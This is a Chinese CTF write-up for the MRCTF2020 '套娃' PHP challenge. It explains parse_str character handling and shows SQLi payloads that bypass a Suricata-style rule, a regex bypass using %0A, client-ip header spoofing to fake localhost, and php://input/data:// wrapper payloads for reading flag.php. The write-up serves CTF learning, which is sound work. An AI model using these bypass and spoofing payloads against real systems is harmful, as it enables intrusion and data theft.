# [MRCTF2020]套娃 GET POST 读取字符串特性 伪造ip 伪协议伪造 file_get_contents()

## 

## 知识点

 [利用PHP的字符串解析特性Bypass - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/213359.html) 

我们通过GETPOST 传递参数是将字符串作为数组传递

那么传递了参数 做了什么操作

这里是通过 parse_str 来处理的



<img src="https://i-blog.csdnimg.cn/blog_migrate/815e928b94cbe53b1d5ad4d23d3ca5e2.png" alt="" style="max-height:294px; box-sizing:content-box;" />


这里能发现 就是进行了两个操作

```undefined
删除空白符
 
将有一些特殊符号转变为下划线
```

运用这里我们就可以绕过许多的waf 或者拦截

```cobol
alert http any any -> $HOME_NET any (\
    msg: "Block SQLi"; flow:established,to_server;\
    content: "POST"; http_method;\
    pcre: "/news_id=[^0-9]+/Pi";\
    sid:1234567;\
)
```

例如上面存在这个规则 过滤了 news_id

我们要如何实现绕过呢， 下面这些方法都可以实现

```cobol
news[id=1'+and+1=1#

news%5bid=1'+and+1=1#    这里的 %5b就是 [ 
 
news_id%00=1'+and+1=1#   通过00截断来实现绕过
```

```cobol
{chr}foo_bar -> 20 ( )
{chr}foo_bar -> 26 (&)
{chr}foo_bar -> 2b (+)
foo{chr}bar -> 20 ( )
foo{chr}bar -> 2b (+)
foo{chr}bar -> 2e (.)
foo{chr}bar -> 5b ([)
foo{chr}bar -> 5f (_)
foo_bar{chr} -> 00 ()
foo_bar{chr} -> 26 (&)
foo_bar{chr} -> 3d (=)
```

这里面就显示了 我们 在每个位置可以 选择绕过的 字符

## 做题

首先可以通过查看源代码获得提示

```cobol
<!--
//1st
$query = $_SERVER['QUERY_STRING'];
 
 if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
    die('Y0u are So cutE!');
}
 if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
    echo "you are going to the next ~";
}
!-->
```

然后我们需要绕过 第一个判断个数 又要过第二个正则 正则使用 %0A 即可

因为不会匹配第二行  但是 get又会删除第二行

第一个我们如何绕过呢 使用上面的表来桡过

所以payload就是

```cobol
?b.u.p.t=23333%0A
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d13a1e5c7e86430adb09057d34361a54.png" alt="" style="max-height:95px; box-sizing:content-box;" />


出现了新的提示

我们去访问一下这个php

看看源代码 晕了 才知道这个 fuckjs 代码 看别人wp

放到控制台运行



<img src="https://i-blog.csdnimg.cn/blog_migrate/aad61684c3a9492d7403b83f78944090.png" alt="" style="max-height:159px; box-sizing:content-box;" />


我们就post 一下



<img src="https://i-blog.csdnimg.cn/blog_migrate/63c147650b8517e4a2ba6de696ef04e2.png" alt="" style="max-height:188px; box-sizing:content-box;" />


```cobol
Flag is here~But how to get it? <?php 
error_reporting(0); 
include 'takeip.php';
ini_set('open_basedir','.'); 
include 'flag.php';
 
if(isset($_POST['Merak'])){ 
    highlight_file(__FILE__); 
    die(); 
}
 
 
function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
这里是通过循环 可能是改变东西 不着急 到时候看看
 
 
 
echo 'Local access only!'."<br/>";
$ip = getIp();
这里需要伪造本地ip访问
通过 client-ip:127.0.0.1
 
 
if($ip!='127.0.0.1')
echo "Sorry,you don't have permission!  Your ip is :".$ip;
if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
这里需要本地ip 并且通过get2333打开文件 里面内容为 todat is a happy day
 
echo "Your REQUEST is:".change($_GET['file']);
echo file_get_contents(change($_GET['file'])); }
这里显然是需要通过 change来获得 flag.php 高亮
?>  
 
代码审计一下
```

这里主要就是伪造ip  client-ip:127.0.0.1

其次就是通过 fie_get_content读取

这里又两个方式

### 读取方法一

```cobol
?2333=php://input
 
 
POST内容中
 
todat is a happy day
```

### 方法二

```cobol
通过 data伪协议
 
?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=
```

这两个方法都可以

选择就是如何绕过 change 输出flag  就要开始逆向了

```php
 
function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
 
 
首先通过 base64解密 然后对内容进行 +
 
我们逆向就先对内容进行 - 然后 base64加密即可
 
<?php
 
function change($v){ 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) - $i*2 ); 
    } 
    return base64_encode($re); 
}
echo change("flag.php");
```

获得了 flag.php的加密

```cobol
ZmpdYSZmXGI=
```

我们现在传递参数即可

```cobol
?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&file=ZmpdYSZmXGI=
 
请求头
 
client-ip:127.0.0.1
```

或者



```cobol
?2333=php://input&file=ZmpdYSZmXGI=
 
POST
 
todat is a happy day
 
请求头
 
client-ip:127.0.0.1
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/af1663453158b7563abcb32050a27348.png" alt="" style="max-height:301px; box-sizing:content-box;" />


这里就得出来 flag

确实和题目中的一样 套中套啊